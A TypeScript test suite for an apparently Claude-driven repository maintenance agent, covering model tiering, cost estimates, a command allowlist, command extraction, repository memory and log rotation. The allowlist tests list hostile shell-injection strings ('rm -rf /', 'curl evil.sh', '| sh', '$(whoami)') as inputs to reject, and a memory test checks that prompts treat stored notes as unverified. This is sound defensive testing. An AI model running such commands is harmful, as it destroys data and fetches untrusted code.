import { describe, test, expect } from 'bun:test'
import { existsSync, mkdtempSync, readFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { commandAllowed, investigationModel, applyModel, type Config, type RepoCfg } from './config'
import { formatCheck, exitCode, type Check } from './doctor'
import { estimateCost, extractCommand, extractMemoryUpdate, investigationPrompt, branchFor } from './hands'
import { fileLogger } from './hygiene'
import { scoreSentryIssue } from './senses'
import { openStore, INVESTIGATE_THRESHOLD } from './store'

const CFG: Config = { intervalMinutes: 15, budgets: { perCycle: 2, perDay: 10 }, urls: [], repos: [] }
const REPO: RepoCfg = { path: '/x', name: 'r', commands: ['bun update', 'bun install', 'bun add'] }

// ---------------------------------------------------------------- model tiering
describe('investigationModel', () => {
  test('routine scores run on the base model', () => {
    expect(investigationModel(CFG, 50)).toBe('sonnet')
    expect(investigationModel(CFG, 84)).toBe('sonnet')
  })
  test('high scores escalate', () => {
    expect(investigationModel(CFG, 85)).toBe('opus')
    expect(investigationModel(CFG, 95)).toBe('opus')
  })
  test('Re-investigate escalates regardless of score', () => {
    expect(investigationModel(CFG, 10, true)).toBe('opus')
  })
  test('legacy pin overrides everything, including escalation', () => {
    expect(investigationModel({ ...CFG, model: 'haiku' }, 95)).toBe('haiku')
    expect(investigationModel({ ...CFG, model: 'haiku' }, 10, true)).toBe('haiku')
  })
  test('custom tiers + threshold', () => {
    const c = { ...CFG, models: { base: 'haiku', escalated: 'sonnet' }, escalateScore: 70 }
    expect(investigationModel(c, 69)).toBe('haiku')
    expect(investigationModel(c, 70)).toBe('sonnet')
  })
  test('partial models config falls back per-field', () => {
    expect(investigationModel({ ...CFG, models: { base: 'haiku' } }, 90)).toBe('opus')
  })
})

describe('applyModel', () => {
  test('defaults to the base tier — never the CLI default', () => {
    expect(applyModel(CFG)).toBe('sonnet')
  })
  test('legacy pin and models.base are honoured', () => {
    expect(applyModel({ ...CFG, model: 'haiku' })).toBe('haiku')
    expect(applyModel({ ...CFG, models: { base: 'haiku' } })).toBe('haiku')
  })
})

// ---------------------------------------------------------------- killed-run cost estimate
describe('estimateCost', () => {
  test('per-tier rates track published pricing ratios (fable:opus:sonnet:haiku ≈ 10:5:3:1)', () => {
    const min3 = 180_000
    expect(estimateCost('haiku', min3)).toBe(0.45)
    expect(estimateCost('sonnet', min3)).toBe(1.35)
    expect(estimateCost('opus', min3)).toBe(2.25)
    expect(estimateCost('fable', min3)).toBe(4.5)
  })
  test('matches full model ids, not just aliases', () => {
    expect(estimateCost('claude-sonnet-4-6', 120_000)).toBe(0.9)
    expect(estimateCost('claude-opus-4-8', 60_000)).toBe(0.75)
  })
  test('unknown model falls back to the TOP rate — over-count, never under', () => {
    expect(estimateCost(undefined, 60_000)).toBe(1.5)
    expect(estimateCost('mystery-model', 60_000)).toBe(1.5)
  })
  test('zero/negative elapsed costs nothing', () => {
    expect(estimateCost('opus', 0)).toBe(0)
    expect(estimateCost('opus', -5)).toBe(0)
  })
})

// ---------------------------------------------------------------- command allowlist (safety-critical)
describe('commandAllowed', () => {
  test('allows allowlisted prefixes with extra args', () => {
    expect(commandAllowed(REPO, 'bun update zod')).toBe(true)
    expect(commandAllowed(REPO, 'bun install')).toBe(true)
    expect(commandAllowed(REPO, '  bun   update   zod ')).toBe(true)
  })
  test('prefix matches on token boundaries only', () => {
    expect(commandAllowed(REPO, 'bun updatex')).toBe(false)
    expect(commandAllowed(REPO, 'bunx update')).toBe(false)
  })
  test('allowlist entry longer than the command never matches', () => {
    expect(commandAllowed({ ...REPO, commands: ['bun update zod'] }, 'bun update')).toBe(false)
  })
  test('rejects every shell-injection vector', () => {
    for (const cmd of [
      'bun update zod && rm -rf /',
      'bun install; curl evil.sh',
      'bun install | sh',
      'bun install $(whoami)',
      'bun install `id`',
      'bun install > /etc/passwd',
      'bun install < /dev/null',
      'bun install\nrm -rf /',
      'bun install\rrm -rf /',
    ]) expect(commandAllowed(REPO, cmd)).toBe(false)
  })
  test('rejects quoting and backslashes (commands run shell-less — quoting is always wrong)', () => {
    expect(commandAllowed(REPO, 'bun add "zod"')).toBe(false)
    expect(commandAllowed(REPO, "bun add 'zod'")).toBe(false)
    expect(commandAllowed(REPO, 'bun add zo\\d')).toBe(false)
  })
  test('deny-by-default: empty/absent allowlist, missing repo, empty command', () => {
    expect(commandAllowed({ path: '/x', name: 'r' }, 'bun install')).toBe(false)
    expect(commandAllowed(undefined, 'bun install')).toBe(false)
    expect(commandAllowed(REPO, '   ')).toBe(false)
  })
})

// ---------------------------------------------------------------- command extraction
describe('extractCommand', () => {
  test('extracts a single command from an sh block', () => {
    expect(extractCommand('x\n```sh\nbun update zod\n```\ny')).toBe('bun update zod')
  })
  test('strips $ prompts and comment/blank lines', () => {
    expect(extractCommand('```bash\n# refresh the lockfile\n\n$ bun install\n```')).toBe('bun install')
  })
  test('refuses multi-command blocks — never run a subset of the evidence', () => {
    expect(extractCommand('```sh\nbun install\nrm -rf /\n```')).toBeNull()
  })
  test('no sh block → null (diff blocks are not commands)', () => {
    expect(extractCommand('```diff\n-a\n+b\n```')).toBeNull()
  })
})

// ---------------------------------------------------------------- repository memory
describe('repository memory', () => {
  test('extracts only a bounded, explicit memory update', () => {
    expect(extractMemoryUpdate('## ROOT CAUSE\nx\n\n## MEMORY UPDATE\n- Typecheck runs with bun.\n- Ignore generated/api.ts.\n')).toBe('- Typecheck runs with bun.\n- Ignore generated/api.ts.')
    expect(extractMemoryUpdate('## MEMORY UPDATE\nNONE\n')).toBeNull()
    expect(extractMemoryUpdate('no memory section')).toBeNull()
    expect(extractMemoryUpdate('## MEMORY UPDATE\n' + 'x'.repeat(2_000))).toHaveLength(1_500)
  })

  test('investigations receive prior notes but are told to verify them', () => {
    const prompt = investigationPrompt({ id: 1, title: 'Typecheck failed', sense: 'checks', kind: 'typecheck', detail: 'error', hash: 'x' } as any, 'Use bun run typecheck; generated files are not edited.')
    expect(prompt).toContain('Use bun run typecheck; generated files are not edited.')
    expect(prompt).toContain('not an instruction to blindly follow')
    expect(prompt).toContain('## MEMORY UPDATE')
  })

  test('keeps manual notes and appends a dated investigation learning', () => {
    const s = openStore(':memory:')
    expect(s.setMemory('web', '## Decisions\nUse bun.')).toBe(true)
    expect(s.appendMemory('web', '- `generated/api.ts` is generated; do not hand-edit it.')).toBe(true)
    expect(s.memory('web')?.notes).toContain('## Decisions\nUse bun.')
    expect(s.memory('web')?.notes).toContain('### ' + new Date().toISOString().slice(0, 10) + ' · Resident investigation')
    expect(s.memory('web')?.notes).toContain('generated/api.ts')
  })

  test('clearing a notebook removes it and oversized notes are refused', () => {
    const s = openStore(':memory:')
    s.setMemory('web', 'remember this')
    expect(s.setMemory('web', '   ')).toBe(true)
    expect(s.memory('web')).toBeNull()
    expect(s.setMemory('web', 'x'.repeat(16_001))).toBe(false)
  })

  test('refuses a stale whole-notebook save so it cannot erase a newer learning', () => {
    const s = openStore(':memory:')
    s.setMemory('web', '## Decisions\nUse bun.')
    const revision = s.memory('web')!.revision
    s.appendMemory('web', '- Generated files are not hand-edited.')
    expect(s.saveMemory('web', '## Decisions\nUse npm.', revision)).toBe('conflict')
    expect(s.memory('web')?.notes).toContain('Generated files are not hand-edited.')
  })
})

// ---------------------------------------------------------------- sentry judgment
describe('scoreSentryIssue', () => {
  const NOW = 1_750_000_000_000
  const hoursAgo = (h: number) => new Date(NOW - h * 3_600_000).toISOString()
  test('new errors burn hot, fatal hotter', () => {
    expect(scoreSentryIssue({ id: '1', level: 'error', firstSeen: hoursAgo(3) }, NOW)).toBe(82)
    expect(scoreSentryIssue({ id: '1', level: 'fatal', firstSeen: hoursAgo(3) }, NOW)).toBe(92)
  })
  test('unhandled bumps the score', () => {
    expect(scoreSentryIssue({ id: '1', level: 'fatal', firstSeen: hoursAgo(3), isUnhandled: true }, NOW)).toBe(96)
  })
  test('substatus "new" counts as new even with an older firstSeen', () => {
    expect(scoreSentryIssue({ id: '1', level: 'error', substatus: 'new', firstSeen: hoursAgo(100) }, NOW)).toBe(82)
  })
  test('regressions and escalations matter', () => {
    expect(scoreSentryIssue({ id: '1', level: 'error', substatus: 'regressed', firstSeen: hoursAgo(500) }, NOW)).toBe(78)
    expect(scoreSentryIssue({ id: '1', level: 'error', substatus: 'escalating', firstSeen: hoursAgo(500) }, NOW)).toBe(78)
  })
  test('old ongoing noise stays below the investigate threshold (visible, not alarming)', () => {
    expect(scoreSentryIssue({ id: '1', level: 'error', substatus: 'ongoing', firstSeen: hoursAgo(500) }, NOW)).toBeLessThan(INVESTIGATE_THRESHOLD)
  })
  test('new warnings stay below the threshold too', () => {
    expect(scoreSentryIssue({ id: '1', level: 'warning', firstSeen: hoursAgo(3) }, NOW)).toBeLessThan(INVESTIGATE_THRESHOLD)
  })
})

// ---------------------------------------------------------------- branch naming
describe('branchFor', () => {
  test('deterministic, slugged, length-capped', () => {
    expect(branchFor({ id: 7, title: 'PR #20 has merge conflicts — “Added plants”' })).toBe('resident/7-pr-20-has-merge-conflicts-added-plants')
    expect(branchFor({ id: 7, title: 'x'.repeat(100) }).length).toBeLessThanOrEqual('resident/7-'.length + 40)
  })
})

// ---------------------------------------------------------------- store (in-memory)
describe('store', () => {
  const finding = (over: Record<string, unknown> = {}) => ({
    hash: 'h1', sense: 'git', repo: 'r', kind: 'k', title: 't', detail: 'd', score: 60, status: 'queued' as const, ...over,
  })
  test('upsert dedupes by hash and refreshes score/title', () => {
    const s = openStore(':memory:')
    expect(s.upsertFinding(finding())).toBe('new')
    expect(s.upsertFinding(finding({ title: 't2', score: 70 }))).toBe('existing')
    const it = s.items(10)[0]
    expect(it.title).toBe('t2')
    expect(it.score).toBe(70)
    expect(s.items(10).length).toBe(1)
  })
  test('ignored items get promoted to queued when the score crosses the threshold', () => {
    const s = openStore(':memory:')
    s.upsertFinding(finding({ status: 'ignored', score: 20 }))
    s.upsertFinding(finding({ score: INVESTIGATE_THRESHOLD }))
    expect(s.items(10)[0].status).toBe('queued')
  })
  test('ignored items stay ignored below the threshold', () => {
    const s = openStore(':memory:')
    s.upsertFinding(finding({ status: 'ignored', score: 20 }))
    s.upsertFinding(finding({ score: INVESTIGATE_THRESHOLD - 1 }))
    expect(s.items(10)[0].status).toBe('ignored')
  })
  test('queued() orders by score desc and respects the budget limit', () => {
    const s = openStore(':memory:')
    s.upsertFinding(finding({ hash: 'a', score: 60 }))
    s.upsertFinding(finding({ hash: 'b', score: 90 }))
    s.upsertFinding(finding({ hash: 'c', score: 75 }))
    const q = s.queued(2)
    expect(q.map((i) => i.score)).toEqual([90, 75])
  })
  test('update() patches partial fields incl. nulls and escalate semantics', () => {
    const s = openStore(':memory:')
    s.upsertFinding(finding())
    const id = s.items(1)[0].id
    s.update(id, { status: 'queued', escalate: 1, reason: 'fresh look' })
    expect(s.byId(id)!.escalate).toBe(1)
    s.update(id, { status: 'ready', escalate: 0, reason: null })
    const it = s.byId(id)!
    expect(it.escalate).toBe(0)
    expect(it.reason).toBeNull()
  })
  test('daily budget + cost ledger accumulate', () => {
    const s = openStore(':memory:')
    expect(s.usedToday()).toBe(0)
    s.bumpToday(); s.bumpToday()
    expect(s.usedToday()).toBe(2)
    s.addCost(0.5); s.addCost(0.25)
    expect(s.costToday()).toBeCloseTo(0.75)
  })
})

// ---------------------------------------------------------------- retention / archiveOld
describe('archiveOld', () => {
  const DAY = 86_400_000
  // a settled item whose last touch was `ageDays` ago (update bypasses store.update, which stamps `updated` with now)
  const seed = (s: ReturnType<typeof openStore>, hash: string, status: string, ageDays: number) => {
    s.upsertFinding({ hash, sense: 'git', repo: 'r', kind: 'k', title: hash, detail: '', score: 60, status: status as any })
    s.db.run('UPDATE items SET updated=? WHERE hash=?', [Date.now() - ageDays * DAY, hash])
  }
  test('archives terminal items past the cutoff and returns the count', () => {
    const s = openStore(':memory:')
    for (const st of ['merged', 'closed', 'dismissed', 'failed', 'ignored']) seed(s, st, st, 31)
    expect(s.archiveOld(30)).toBe(5)
    expect(s.items(10)).toEqual([])
    expect(s.archivedCount()).toBe(5)
  })
  test('age boundary: younger-than-N stays, older-than-N goes', () => {
    const s = openStore(':memory:')
    seed(s, 'young', 'dismissed', 29)
    seed(s, 'old', 'dismissed', 31)
    expect(s.archiveOld(30)).toBe(1)
    const left = s.items(10)
    expect(left.length).toBe(1)
    expect(left[0].hash).toBe('young')
  })
  test('live statuses never archive, however old', () => {
    const s = openStore(':memory:')
    for (const st of ['queued', 'investigating', 'ready', 'approving', 'approved', 'working', 'tracked']) seed(s, st, st, 365)
    expect(s.archiveOld(30)).toBe(0)
    expect(s.items(10).length).toBe(7)
  })
  test('0 or negative days disables retention', () => {
    const s = openStore(':memory:')
    seed(s, 'old', 'merged', 365)
    expect(s.archiveOld(0)).toBe(0)
    expect(s.archiveOld(-5)).toBe(0)
    expect(s.items(10).length).toBe(1)
  })
  test('idempotent — the second pass finds nothing left', () => {
    const s = openStore(':memory:')
    seed(s, 'old', 'closed', 31)
    expect(s.archiveOld(30)).toBe(1)
    expect(s.archiveOld(30)).toBe(0)
    expect(s.archivedCount()).toBe(1)
  })
  test('items() and queued() hide archived rows; byId still sees them (audit)', () => {
    const s = openStore(':memory:')
    seed(s, 'q', 'queued', 1)
    const id = s.items(10)[0].id
    s.db.run('UPDATE items SET archived=1 WHERE id=?', [id])
    expect(s.items(10)).toEqual([])
    expect(s.queued(10)).toEqual([])
    expect(s.byId(id)?.archived).toBe(1)
  })
  test('a returning finding un-archives its row — retention must not hide a live problem', () => {
    const s = openStore(':memory:')
    seed(s, 'h', 'ignored', 31)
    expect(s.archiveOld(30)).toBe(1)
    s.upsertFinding({ hash: 'h', sense: 'git', repo: 'r', kind: 'k', title: 'h', detail: '', score: 60, status: 'queued' })
    expect(s.items(10).length).toBe(1)
    expect(s.items(10)[0].status).toBe('queued') // ignored→queued promotion still applies on the way back
  })
})

// ---------------------------------------------------------------- log rotation
describe('fileLogger', () => {
  const tmpLog = () => join(mkdtempSync(join(tmpdir(), 'resident-log-')), 'resident.log')
  const STAMP = 20 // 'YYYY-MM-DD HH:MM:SS ' prefix on every line

  test('writes lines with the ANSI stripped', () => {
    const path = tmpLog()
    const log = fileLogger(path, 1024)
    log.write('\x1b[2m08:00:00\x1b[0m ◉ cycle started')
    const body = readFileSync(path, 'utf8')
    expect(body).toContain('◉ cycle started')
    expect(body).not.toContain('\x1b')
  })
  test('threshold is strict — a file at exactly maxBytes stays put', () => {
    const path = tmpLog()
    const line = 'abc' // on disk: stamp + line + \n = STAMP + 4 bytes
    const log = fileLogger(path, STAMP + line.length + 1)
    log.write(line)
    log.maybeRotate()
    expect(existsSync(`${path}.1`)).toBe(false)
    expect(readFileSync(path, 'utf8')).toContain('abc')
  })
  test('rotates past the threshold and keeps writing to a fresh file', () => {
    const path = tmpLog()
    const log = fileLogger(path, 64)
    log.write('x'.repeat(80))
    log.maybeRotate()
    expect(readFileSync(`${path}.1`, 'utf8')).toContain('x'.repeat(80))
    log.write('after-rotation')
    const live = readFileSync(path, 'utf8')
    expect(live).toContain('after-rotation')
    expect(live).not.toContain('xxx')
  })
  test('keeps exactly one generation — the next rotation replaces .1', () => {
    const path = tmpLog()
    const log = fileLogger(path, 32)
    log.write('first-' + 'a'.repeat(40))
    log.maybeRotate()
    log.write('second-' + 'b'.repeat(40))
    log.maybeRotate()
    const gen = readFileSync(`${path}.1`, 'utf8')
    expect(gen).toContain('second-')
    expect(gen).not.toContain('first-')
    expect(readFileSync(path, 'utf8')).toBe('')
  })
  test('an unwritable path degrades to a no-op instead of throwing', () => {
    const log = fileLogger('/dev/null/impossible/resident.log', 64)
    log.write('into the void')
    log.maybeRotate()
    log.write('still alive')
  })
})

// ---------------------------------------------------------------- doctor (pure parts)
describe('doctor', () => {
  const c = (verdict: Check['verdict'], hint?: string): Check => ({ name: 'git', verdict, detail: 'd', hint })
  const strip = (s: string) => s.replace(/\x1b\[[0-9;]*m/g, '')

  test('exit 1 only on ✗ — warnings and informationals pass', () => {
    expect(exitCode([c('ok'), c('warn'), c('info')])).toBe(0)
    expect(exitCode([c('ok'), c('fail')])).toBe(1)
    expect(exitCode([])).toBe(0)
  })
  test('each verdict renders its glyph', () => {
    expect(strip(formatCheck(c('ok'), 6))).toStartWith('  ✓ ')
    expect(strip(formatCheck(c('warn'), 6))).toStartWith('  ⚠ ')
    expect(strip(formatCheck(c('fail'), 6))).toStartWith('  ✗ ')
    expect(strip(formatCheck(c('info'), 6))).toStartWith('  − ')
  })
  test('details align on the pad width', () => {
    expect(strip(formatCheck(c('ok'), 10))).toBe('  ✓ git       d')
  })
  test('hints land on their own dim line, aligned under the detail', () => {
    const out = strip(formatCheck(c('fail', 'gh auth login'), 10))
    const [line, hint] = out.split('\n')
    expect(hint).toBe(`${' '.repeat(14)}↳ gh auth login`)
    expect(line.indexOf('d')).toBe(hint.indexOf('↳'))
    expect(strip(formatCheck(c('ok'), 10))).not.toContain('\n')
  })
})
